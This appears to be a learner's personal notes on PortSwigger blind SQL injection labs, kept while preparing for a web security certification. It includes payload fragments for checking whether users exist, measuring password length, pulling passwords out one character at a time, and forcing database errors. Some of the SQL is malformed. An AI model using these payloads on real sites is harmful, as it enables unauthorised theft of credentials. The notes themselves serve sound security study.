# PortSwigger Labs -Notes
Am i getting ready for BSCP? I don't know


## SQL injection
###  blind - Conditional Responses
    Take a look and see wheather the page displays certain messages. Page's size is handful.

    * You might use it to determine if the username existing within the table
        This queries evaluates if the given username exists inside the table
        and (select 'a' from users where username = 'foo')='a
    
    * To get the password length. 
        and (select 'a' from users where username = 'foo' and length(password)>1)='a

    * To get the password by issuing one char at a time while looping through the password length
        The incremental must be where the first 1 is at.
        and (select substring(password,1,1) from users where username = 'foo')=§
    

### blind - Trigerring conditional errors

    * It can be used to return a database error (stack trace??) containing a specific given payload
        this payload `select` something. If this `thing` equal to 1 it gets devided by 0 or it `echoes` back a letter
        and (select case when (1=1) then 1/0 else 'a)='a

        #SUBSTRING PASSWORD GUESSING WITH CASE - HOME LAB
        select password (case when substring(password, 2,1) = 'u' then "RIGHT" else "NOOO" end) from blah where user = 'nobody';
